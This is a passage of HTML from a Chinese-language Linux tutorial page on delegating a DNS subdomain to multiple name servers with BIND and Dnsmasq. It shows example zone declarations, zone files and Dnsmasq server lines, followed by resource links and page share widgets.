id=\"crayon-5b6259dcd68fe760265498-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68fe760265498-6\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd68fe760265498-7\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd68fe760265498-8\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0023 seconds] -->\r\n<p>接下来的每台子域服务器上有它们自己的区文件。在这里它的关键点是每个服务器去返回它<strong>自己的</strong> IP 地址。在 <code>named.conf</code> 中的区声明，所有的服务上都是一样的：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd6901422131072\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nzone \"sub.example.com\" {\r\n    type master;\r\n    file \"db.sub.example.com\";\r\n};\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6901422131072-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6901422131072-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6901422131072-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6901422131072-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6901422131072-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd6901422131072-1\"><span class=\"crayon-i\">zone</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"sub.example.com\"</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6901422131072-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">type </span><span class=\"crayon-v\">master</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6901422131072-3\"><span class=\"crayon-h\">    </span><span class=\"crayon-i\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"db.sub.example.com\"</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6901422131072-4\"><span class=\"crayon-sy\">}</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6901422131072-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>然后数据文件也是相同的，除了那个 A/AAAA 记录使用的是各个服务器自己的 IP 地址。SOA 记录都指向到主域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd6905266134748\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n; first subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018123456      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.20\r\nns1.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::20\r\n; second subdomain name server\r\n$ORIGIN sub.example.com.\r\n$TTL 60\r\nsub.example.com  IN SOA ns1.example.com. admin.example.com. (\r\n        2018234567      ; serial\r\n        3H              ; refresh\r\n        15              ; retry\r\n        3600000         ; expire\r\n)\r\n\r\nsub.example.com. IN NS ns1.sub.example.com.\r\nsub.example.com. IN A  172.16.1.21\r\nns2.sub.example.com.  IN AAAA  fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6905266134748-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6905266134748-27\">27</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-1\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">first </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-2\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-4\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018123456</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-6\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-9\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-11\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-12\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-13\"><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-14\"><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">second </span><span class=\"crayon-e\">subdomain </span><span class=\"crayon-e\">name </span><span class=\"crayon-i\">server</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-15\"><span class=\"crayon-sy\">$</span><span class=\"crayon-e\">ORIGIN </span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-16\"><span class=\"crayon-sy\">$</span><span class=\"crayon-i\">TTL</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">60</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-17\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">com  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">SOA </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">admin</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-18\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">2018234567</span><span class=\"crayon-h\">      </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">serial</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3H</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">refresh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">15</span><span class=\"crayon-h\">              </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">retry</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-21\"><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">3600000</span><span class=\"crayon-h\">         </span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">expire</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-22\"><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-23\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-24\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NS </span><span class=\"crayon-v\">ns1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-25\"><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">A</span><span class=\"crayon-h\">  </span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6905266134748-26\"><span class=\"crayon-v\">ns2</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\">  </span><span class=\"crayon-st\">IN</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">AAAA  </span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6905266134748-27\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0050 seconds] -->\r\n<p>接下来生成子域服务器上的轮询记录，方法和前面一样。现在你已经有了多个域名服务器来处理到你的子域的请求。再说一次，BIND 是很复杂的，做同一件事情它有多种方法，因此，给你留的家庭作业是找出适合你使用的最佳配置方法。</p>\n<p>在 Dnsmasq 中做子域委派很容易。在你的主域名服务器上的 <code>dnsmasq.conf</code> 文件中添加如下的行，去指向到子域的域名服务器：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b6259dcd6908371110403\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nserver=/sub.example.com/172.16.1.20\r\nserver=/sub.example.com/172.16.1.21\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::20\r\nserver=/sub.example.com/fd02:faea:f561:8fa0:1::21\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6908371110403-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6908371110403-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6908371110403-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b6259dcd6908371110403-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b6259dcd6908371110403-5\">5</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b6259dcd6908371110403-1\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6908371110403-2\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">172.16.1.21</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6908371110403-3\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">20</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b6259dcd6908371110403-4\"><span class=\"crayon-v\">server</span><span class=\"crayon-o\">=</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">sub</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">example</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">com</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">fd02</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">faea</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">f561</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">8fa0</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">1</span><span class=\"crayon-o\">::</span><span class=\"crayon-cn\">21</span></div><div class=\"crayon-line\" id=\"crayon-5b6259dcd6908371110403-5\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0014 seconds] -->\r\n<p>然后在子域的域名服务器上的 <code>/etc/hosts</code> 中配置轮询。</p>\n<p>获取配置方法的详细内容和帮助，请参考这些资源：</p>\n<ul>\n<li><a href=\"http://www.thekelleys.org.uk/dnsmasq/doc.html\">Dnsmasq</a></li>\n<li><a href=\"http://shop.oreilly.com/product/9780596100575.do\">DNS and BIND, 5th Edition</a></li>\n</ul>\n<p>通过来自 Linux 基金会和 edX 的免费课程 <a href=\"https://training.linuxfoundation.org/linux-courses/system-administration-training/introduction-to-linux\">“Linux 入门” </a> 学习更多 Linux 的知识。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114157\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114157votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114157\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis 